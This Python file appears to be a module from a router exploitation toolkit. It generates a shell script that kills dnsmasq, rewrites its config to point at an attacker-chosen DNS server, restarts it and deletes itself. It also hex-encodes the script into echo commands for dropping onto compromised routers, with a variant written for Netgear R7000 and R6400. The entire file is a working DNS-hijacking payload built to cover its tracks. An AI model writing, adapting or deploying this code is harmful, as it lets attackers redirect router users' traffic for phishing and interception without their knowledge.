#coding: utf-8
import string
from route_pwn_common import *
import os

class dnsmasq_poison:
    def __init__(self,new_dns_server='192.168.220.5', dns_conf_path='/var/servd/DNS.conf', restart_cmd='dnsmasq -C /var/servd/DNS.conf'):
        self.new_dns_server = new_dns_server
        self.dns_conf_path = dns_conf_path
        self.restart_cmd = restart_cmd
        self.debug = False

    def set_debug_mode(self):
        self.debug = True

    def __get_dnsmasq_poison_shell(self):
        val_dns_path = random_text(1,string.ascii_letters) + random_text(8)
        val_new_dns_server = random_text(1,string.ascii_letters) + random_text(6)
        val_restart_cmd = random_text(1,string.ascii_letters) + random_text(7)
        val_dns_tmp_file1 = '/tmp/'+ random_text(1,string.ascii_letters) + random_text(6)
        val_dns_tmp_file2 = '/tmp/'+ random_text(1,string.ascii_letters) + random_text(6)
        ## depend on: ps/grep/cut/sed

        dns_shell = ''
        dns_shell += '#!/bin/sh\n'
        dns_shell += '%s=$1\n'% val_dns_path
        dns_shell += '%s=$2\n' % val_new_dns_server
        dns_shell += "%s='$3'\n" % val_restart_cmd
        dns_shell += 'for i in 1 2 3 4 5\n'
        dns_shell += 'do\n'
        dns_shell += 'pid=`ps|grep dnsmasq|grep -v grep|cut -d " " -f $i`\n'
        dns_shell += 'if [ z"" != z$pid ];then\n'
        dns_shell += 'break\n'
        dns_shell += 'fi\n'
        dns_shell += 'done\n'
        dns_shell += 'cp $%s %s\n' % (val_dns_path,val_dns_tmp_file1)
        dns_shell += 'kill -9 $pid\n'
        dns_shell += 'cat %s| sed -r "s/server=[0-9\.]+/server=$2/g" > %s\n' % (val_dns_tmp_file1,val_dns_tmp_file2)
        #netgear r7000 && r6400
        dns_shell += 'cat %s| sed -r "s/nameserver [0-9\.]+/nameserver $2/g" > $%s\n' % (val_dns_tmp_file2,val_dns_path)
        dns_shell += 'rm -rf %s\n' % val_dns_tmp_file1
        dns_shell += 'rm -rf %s\n' % val_dns_tmp_file2
        dns_shell += '$%s\n' % val_restart_cmd
        dns_shell += 'echo $0\n'
        if not self.debug:
            dns_shell += 'rm -rf $0\n'


        dns_shell = dns_shell.replace('$1',self.dns_conf_path)
        dns_shell = dns_shell.replace('$2',self.new_dns_server)
        dns_shell = dns_shell.replace('$3',self.restart_cmd)

        return dns_shell

    def get_dns_poison_shell_cmds(self, max_print=100, echo_suffix=' #'):
        tmp_dir = '/tmp/'
        wf = '%s.sh' % random_text(8)
        wf = os.path.join(tmp_dir,wf)
        dns_poison_cmds = {
            'size':0,
            'script_name':wf,
            'cmds':[]
        }    #dns_poison_cmds = {'script_name':'1xowjh.sh','cmds':['echo -ne...','',...]}

        dns_script = self.__get_dnsmasq_poison_shell()
        dns_poison_cmds['size'] = len(dns_script)
        for dns_hex in ascii_to_hex(dns_script, max_print):
            dns_cmd = 'echo -ne %s >> %s%s' % (dns_hex,wf,echo_suffix)
            dns_poison_cmds['cmds'].append(dns_cmd)

        # chmod_dns_shell = 'chmod +x /tmp/%s%s' % (wf, cmd_suffix)
        # execute_dns_shell = '/tmp/%s %s %s %s%s' % (wf,self.dns_conf_path,self.new_dns_server,self.restart_cmd,cmd_suffix)
        #
        # #
        # dns_poison_cmds['cmds'].append(chmod_dns_shell)
        # dns_poison_cmds['cmds'].append(execute_dns_shell)
        return dns_poison_cmds

    def get_netgear_dns_poison_shell_cmds(self, max_print=100, echo_suffix=';echo'):
        #netgear r7000 && r6400
        tmp_dir = '"$HOME"tmp"$HOME"'
        wf = '%s.sh' % random_text(8)
        #wf = os.path.join(tmp_dir,wf)
        wf = tmp_dir + wf
        dns_poison_cmds = {
            'size':0,
            'script_name':wf,
            'cmds':[]
        }    #dns_poison_cmds = {'script_name':'1xowjh.sh','cmds':['echo -ne...','',...]}

        dns_script = self.__get_dnsmasq_poison_shell()
        dns_poison_cmds['size'] = len(dns_script)
        for dns_hex in ascii_to_hex(dns_script, max_print):
            dns_cmd = 'echo -ne "%s">>%s%s' % (dns_hex,wf,echo_suffix)
            dns_poison_cmds['cmds'].append(dns_cmd)

        # chmod_dns_shell = 'chmod +x /tmp/%s%s' % (wf, cmd_suffix)
        # execute_dns_shell = '/tmp/%s %s %s %s%s' % (wf,self.dns_conf_path,self.new_dns_server,self.restart_cmd,cmd_suffix)
        #
        # #
        # dns_poison_cmds['cmds'].append(chmod_dns_shell)
        # dns_poison_cmds['cmds'].append(execute_dns_shell)
        return dns_poison_cmds


